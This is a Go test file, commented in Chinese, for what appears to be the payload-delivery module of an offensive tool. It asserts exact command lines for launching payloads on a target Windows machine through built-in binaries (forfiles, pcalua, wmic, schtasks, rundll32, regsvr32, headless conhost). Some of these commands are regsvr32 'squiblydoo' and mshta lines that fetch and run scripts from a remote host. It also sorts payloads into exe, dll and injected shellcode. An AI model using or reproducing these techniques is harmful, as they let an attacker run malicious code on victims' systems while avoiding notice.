package delivery

import (
	"strings"
	"testing"
)

// TestQuoteWinArg 引号处理是这一整个模块最容易出错的地方：
// 路径带空格时引号配错，命令在目标机上就是"文件找不到"。
func TestQuoteWinArg(t *testing.T) {
	cases := []struct {
		in   string
		want string
	}{
		{`C:\Windows\Temp\a.exe`, `C:\Windows\Temp\a.exe`},
		{`C:\Program Files\a.exe`, `"C:\Program Files\a.exe"`},
		{``, `""`},
		{`a"b`, `"a\"b"`},
		// 以反斜杠结尾：闭合引号前必须翻倍，否则引号被转义、整条命令配对错乱
		{`C:\Program Files\`, `"C:\Program Files\\"`},
		{`C:\a b\c\`, `"C:\a b\c\\"`},
	}
	for _, c := range cases {
		if got := quoteWinArg(c.in); got != c.want {
			t.Errorf("quoteWinArg(%q) = %q，期望 %q", c.in, got, c.want)
		}
	}
}

func TestBuildDirect(t *testing.T) {
	got, err := BuildLaunchCommand("direct", "exe", LaunchInput{
		LocalPath: `C:\Windows\Temp\update.exe`, Pass: "s3cret",
	})
	if err != nil {
		t.Fatal(err)
	}
	want := `C:\Windows\Temp\update.exe s3cret`
	if got != want {
		t.Errorf("得到 %q，期望 %q", got, want)
	}
}

func TestBuildDirectQuotesPathWithSpace(t *testing.T) {
	got, err := BuildLaunchCommand("direct", "exe", LaunchInput{
		LocalPath: `C:\Program Files\a.exe`,
	})
	if err != nil {
		t.Fatal(err)
	}
	if !strings.HasPrefix(got, `"C:\Program Files\a.exe"`) {
		t.Errorf("含空格路径必须被引号包住，得到 %q", got)
	}
}

func TestBuildConhostHeadless(t *testing.T) {
	got, err := BuildLaunchCommand("conhost_headless", "exe", LaunchInput{LocalPath: `C:\t\a.exe`})
	if err != nil {
		t.Fatal(err)
	}
	if got != `conhost.exe --headless C:\t\a.exe` {
		t.Errorf("得到 %q", got)
	}
}

// forfiles 的 /c 是再一层命令行：内层引号必须写成 \"，
// 否则 forfiles 交给 cmd 解析时路径带空格就散架。
func TestBuildForfilesEscapesInnerQuotes(t *testing.T) {
	got, err := BuildLaunchCommand("forfiles", "exe", LaunchInput{
		LocalPath: `C:\Program Files\a.exe`, Pass: "pw",
	})
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(got, `/c "cmd /c \"`) {
		t.Errorf("/c 参数应为 cmd /c \\\"...\\\" 形式，得到 %q", got)
	}
	if !strings.Contains(got, `/p "C:\Program Files"`) {
		t.Errorf("/p 应带引号的目录，得到 %q", got)
	}
	if !strings.Contains(got, `/m a.exe`) {
		t.Errorf("/m 应为文件名，得到 %q", got)
	}
}

func TestBuildForfilesRequiresAbsolutePath(t *testing.T) {
	// 只有文件名没有目录时 forfiles 无法工作，应报错而不是生成坏命令
	if _, err := BuildLaunchCommand("forfiles", "exe", LaunchInput{LocalPath: "a.exe"}); err == nil {
		t.Error("缺少目录时应报错")
	}
}

func TestBuildPcalua(t *testing.T) {
	got, err := BuildLaunchCommand("pcalua", "exe", LaunchInput{LocalPath: `C:\t\a.exe`})
	if err != nil {
		t.Fatal(err)
	}
	if got != `pcalua.exe -a C:\t\a.exe -d C:\t` {
		t.Errorf("得到 %q", got)
	}
}

func TestBuildWmic(t *testing.T) {
	got, err := BuildLaunchCommand("wmic_process_call", "exe", LaunchInput{
		LocalPath: `C:\t\a.exe`, Pass: "pw",
	})
	if err != nil {
		t.Fatal(err)
	}
	if got != `wmic process call create "C:\t\a.exe pw"` {
		t.Errorf("得到 %q", got)
	}
}

// explorer 无法透传参数：带口令时应明确拒绝，而不是生成一条口令丢失的命令
func TestBuildExplorerRejectsPass(t *testing.T) {
	if _, err := BuildLaunchCommand("explorer", "exe", LaunchInput{
		LocalPath: `C:\t\a.exe`, Pass: "pw",
	}); err == nil {
		t.Error("explorer 方式带口令时应报错（它不传参）")
	}
	got, err := BuildLaunchCommand("explorer", "exe", LaunchInput{LocalPath: `C:\t\a.exe`})
	if err != nil {
		t.Fatal(err)
	}
	if got != `explorer.exe C:\t\a.exe` {
		t.Errorf("得到 %q", got)
	}
}

func TestBuildSchtasks(t *testing.T) {
	got, err := BuildLaunchCommand("schtasks", "exe", LaunchInput{
		LocalPath: `C:\t\a.exe`, TaskName: "MyTask",
	})
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(got, "/tn MyTask") || !strings.Contains(got, "/create") || !strings.Contains(got, "/run") {
		t.Errorf("得到 %q", got)
	}
	// 未给任务名时应落到默认名而不是空 /tn
	got2, err := BuildLaunchCommand("schtasks", "exe", LaunchInput{LocalPath: `C:\t\a.exe`})
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(got2, "/tn  ") || !strings.Contains(got2, "/tn ") {
		t.Errorf("默认任务名缺失: %q", got2)
	}
}

func TestBuildRundll32(t *testing.T) {
	got, err := BuildLaunchCommand("rundll32", "dll", LaunchInput{LocalPath: `C:\t\a.dll`})
	if err != nil {
		t.Fatal(err)
	}
	if got != `rundll32.exe C:\t\a.dll,Run` {
		t.Errorf("默认导出应为 Run，得到 %q", got)
	}

	got2, err := BuildLaunchCommand("rundll32", "dll", LaunchInput{
		LocalPath: `C:\t\a.dll`, DLLExport: "Start",
	})
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(got2, `a.dll,Start`) {
		t.Errorf("得到 %q", got2)
	}

	// 路径带空格：dll,export 整段加引号（rundll32 支持这种写法）
	got3, err := BuildLaunchCommand("rundll32", "dll", LaunchInput{LocalPath: `C:\Program Files\a.dll`})
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(got3, `"C:\Program Files\a.dll,Run"`) {
		t.Errorf("含空格时应整段加引号，得到 %q", got3)
	}
}

// 导出名里的逗号会破坏 rundll32 的解析，必须拒绝
func TestBuildRundll32RejectsBadExport(t *testing.T) {
	if _, err := BuildLaunchCommand("rundll32", "dll", LaunchInput{
		LocalPath: `C:\t\a.dll`, DLLExport: "Run,extra",
	}); err == nil {
		t.Error("导出名含逗号应报错")
	}
}

func TestBuildRegsvr32DLL(t *testing.T) {
	got, err := BuildLaunchCommand("regsvr32_dll", "dll", LaunchInput{LocalPath: `C:\t\a.dll`})
	if err != nil {
		t.Fatal(err)
	}
	if got != `regsvr32.exe /s C:\t\a.dll` {
		t.Errorf("得到 %q", got)
	}
}

func TestBuildRegsvr32Squiblydoo(t *testing.T) {
	// 缺 HostedURL 时应报错（它执行的是远程 SCT，不是本地路径）
	if _, err := BuildLaunchCommand("regsvr32_squiblydoo", "exe", LaunchInput{
		LocalPath: `C:\t\a.exe`,
	}); err == nil {
		t.Error("缺 HostedURL 应报错")
	}
	got, err := BuildLaunchCommand("regsvr32_squiblydoo", "exe", LaunchInput{
		HostedURL: "http://h/a.sct",
	})
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(got, "/i:http://h/a.sct") || !strings.Contains(got, "scrobj.dll") {
		t.Errorf("得到 %q", got)
	}
}

func TestBuildMshtaRemote(t *testing.T) {
	if _, err := BuildLaunchCommand("mshta_remote", "exe", LaunchInput{}); err == nil {
		t.Error("缺 HostedURL 应报错")
	}
	got, err := BuildLaunchCommand("mshta_remote", "exe", LaunchInput{HostedURL: "http://h/a.hta"})
	if err != nil {
		t.Fatal(err)
	}
	if got != "mshta.exe http://h/a.hta" {
		t.Errorf("得到 %q", got)
	}
}

// 形态不匹配必须明确拒绝：给一条点了必然失败的命令比不给更糟
func TestFormatMismatchRejected(t *testing.T) {
	if _, err := BuildLaunchCommand("rundll32", "exe", LaunchInput{LocalPath: `C:\t\a.exe`}); err == nil {
		t.Error("rundll32 用于 exe 应报错")
	}
	if _, err := BuildLaunchCommand("direct", "dll", LaunchInput{LocalPath: `C:\t\a.dll`}); err == nil {
		t.Error("direct 用于 dll 应报错")
	}
	// 错误信息要说明该方式支持什么，便于排错
	_, err := BuildLaunchCommand("rundll32", "exe", LaunchInput{LocalPath: `C:\t\a.exe`})
	if err == nil || !strings.Contains(err.Error(), "dll") {
		t.Errorf("错误信息应说明支持的形态，实际: %v", err)
	}
}

// 公开资料常见但对原生 PE 无效的方式：给出解释而不是"未知方式"
func TestUnsupportedMethodsExplainWhy(t *testing.T) {
	for _, id := range []string{"installutil", "msbuild", "regasm", "regsvcs"} {
		_, err := BuildLaunchCommand(id, "exe", LaunchInput{LocalPath: `C:\t\a.exe`})
		if err == nil {
			t.Errorf("%s 应报错（对原生 PE 不适用）", id)
			continue
		}
		if !strings.Contains(err.Error(), ".NET") {
			t.Errorf("%s 的错误应说明是 .NET 限定，实际: %v", id, err)
		}
	}
	notes := UnsupportedLaunchNotes()
	if len(notes) == 0 {
		t.Error("不可用方式说明不应为空")
	}
	// 返回的是副本：调用方改它不应影响目录
	notes["installutil"] = "tampered"
	if UnsupportedLaunchNotes()["installutil"] == "tampered" {
		t.Error("UnsupportedLaunchNotes 应返回副本")
	}
}

func TestUnknownMethod(t *testing.T) {
	if _, err := BuildLaunchCommand("no-such-method", "exe", LaunchInput{LocalPath: `C:\t\a.exe`}); err == nil {
		t.Error("未知方式应报错")
	}
}

func TestMissingPath(t *testing.T) {
	for _, id := range []string{"direct", "forfiles", "pcalua", "wmic_process_call", "schtasks", "rundll32", "regsvr32_dll"} {
		if _, err := BuildLaunchCommand(id, "exe", LaunchInput{}); err == nil {
			t.Errorf("%s 缺路径应报错", id)
		}
	}
}

// 空 methodID 落到 direct（默认值），空 format 落到 exe
func TestDefaults(t *testing.T) {
	got, err := BuildLaunchCommand("", "", LaunchInput{LocalPath: `C:\t\a.exe`})
	if err != nil {
		t.Fatal(err)
	}
	if got != `C:\t\a.exe` {
		t.Errorf("空参数应落到 direct/exe，得到 %q", got)
	}
}

// 目录过滤：exe 载荷只应看到支持 exe 的方式
func TestLaunchMethodsForFilters(t *testing.T) {
	exe := LaunchMethodsFor("exe")
	if len(exe) == 0 {
		t.Fatal("exe 方式不应为空")
	}
	for _, m := range exe {
		ok := false
		for _, f := range m.Formats {
			if f == FormatExe {
				ok = true
			}
		}
		if !ok {
			t.Errorf("%s 不支持 exe 却被列出", m.ID)
		}
	}
	// rundll32 只支持 dll，不该出现在 exe 列表里
	for _, m := range exe {
		if m.ID == "rundll32" || m.ID == "regsvr32_dll" {
			t.Errorf("%s 是 DLL 专用，不应出现在 exe 列表", m.ID)
		}
	}

	dll := LaunchMethodsFor("dll")
	ids := map[string]bool{}
	for _, m := range dll {
		ids[m.ID] = true
	}
	if !ids["rundll32"] || !ids["regsvr32_dll"] {
		t.Error("dll 列表应包含 rundll32 与 regsvr32_dll")
	}
	if ids["direct"] {
		t.Error("dll 列表不应包含 direct（它只支持 exe）")
	}

	// 未知形态：返回空而不是全部（避免展示一堆点了失败的）
	if got := LaunchMethodsFor("nonsense"); len(got) != 0 {
		t.Errorf("未知形态应返回空列表，实际 %d 项", len(got))
	}
}

// 每个方式都必须声明它换来了什么、有什么坑 —— 目录的价值就在这里
func TestEveryMethodDocumentsTradeoffs(t *testing.T) {
	for _, m := range LaunchMethods() {
		if m.Name == "" || m.NameEn == "" || m.Description == "" {
			t.Errorf("%s 缺少名称/说明", m.ID)
		}
		if len(m.Formats) == 0 {
			t.Errorf("%s 未声明支持的载荷形态", m.ID)
		}
		if len(m.Buys) == 0 {
			t.Errorf("%s 未说明换来什么（Buys）", m.ID)
		}
		if len(m.Caveats) == 0 {
			t.Errorf("%s 未说明前提与坑（Caveats）", m.ID)
		}
	}
}

// LaunchMethods 返回副本：调用方改它不应影响目录
func TestLaunchMethodsReturnsCopy(t *testing.T) {
	a := LaunchMethods()
	if len(a) == 0 {
		t.Fatal("目录不应为空")
	}
	orig := a[0].ID
	a[0].ID = "tampered"
	if LaunchMethods()[0].ID == "tampered" {
		t.Error("LaunchMethods 应返回副本")
	}
	if LaunchMethods()[0].ID != orig && orig != "tampered" {
		t.Errorf("顺序应稳定，得到 %q", LaunchMethods()[0].ID)
	}
}

// 输出顺序稳定（前端展示不该每次刷新换顺序）
func TestLaunchMethodsStableOrder(t *testing.T) {
	a := LaunchMethods()
	b := LaunchMethods()
	for i := range a {
		if a[i].ID != b[i].ID {
			t.Fatalf("顺序不稳定: %d %q vs %q", i, a[i].ID, b[i].ID)
		}
	}
	for i := 1; i < len(a); i++ {
		if a[i-1].ID > a[i].ID {
			t.Errorf("应按 ID 排序: %q > %q", a[i-1].ID, a[i].ID)
		}
	}
}

// 口令里的引号/反斜杠不能破坏命令行结构
func TestPassWithSpecialChars(t *testing.T) {
	got, err := BuildLaunchCommand("direct", "exe", LaunchInput{
		LocalPath: `C:\t\a.exe`, Pass: `p"w`,
	})
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(got, `"p\"w"`) {
		t.Errorf("口令中的引号应被转义，得到 %q", got)
	}
}

func TestInferLaunchFormat(t *testing.T) {
	cases := []struct {
		save, file string
		want       LaunchFormat
	}{
		{"update.exe", "", FormatExe},
		{"", "payload.dll", FormatDLL},
		{"a.dll", "", FormatDLL},
		{"sc.bin", "", FormatShellcode},
		{"sc.hex", "", FormatShellcode},
		// 大小写不敏感
		{"A.DLL", "", FormatDLL},
		// saveFilename 优先于 fileName
		{"a.dll", "a.exe", FormatDLL},
		// 无后缀 / 都为空 → 默认 exe（绝大多数载荷，且不额外承诺）
		{"update", "", FormatExe},
		{"", "", FormatExe},
	}
	for _, c := range cases {
		if got := InferLaunchFormat(c.save, c.file); got != c.want {
			t.Errorf("InferLaunchFormat(%q,%q) = %q，期望 %q", c.save, c.file, got, c.want)
		}
	}
}

// 落地型载荷必须至少有一个可用方式；shellcode 没有方式是**正确**的，
// 但必须有解释（否则前端只显示空区块，看起来像功能坏了）
func TestInferredFormatIsUsable(t *testing.T) {
	for _, name := range []string{"a.exe", "a.dll"} {
		f := InferLaunchFormat(name, "")
		if len(LaunchMethodsFor(string(f))) == 0 {
			t.Errorf("%s 推断为 %s，但目录里没有可用方式", name, f)
		}
		if LaunchFormatNote(string(f)) != "" {
			t.Errorf("%s 有启动方式，不该再有\"无方式\"说明", name)
		}
	}

	f := InferLaunchFormat("a.bin", "")
	if len(LaunchMethodsFor(string(f))) != 0 {
		t.Error("shellcode 不该有启动方式（它不是可执行文件）")
	}
	if LaunchFormatNote(string(f)) == "" {
		t.Error("shellcode 必须给出解释，否则前端是个空区块")
	}
	if !strings.Contains(LaunchFormatNote(string(f)), "注入") {
		t.Errorf("解释应说明需要注入，实际: %q", LaunchFormatNote(string(f)))
	}
}
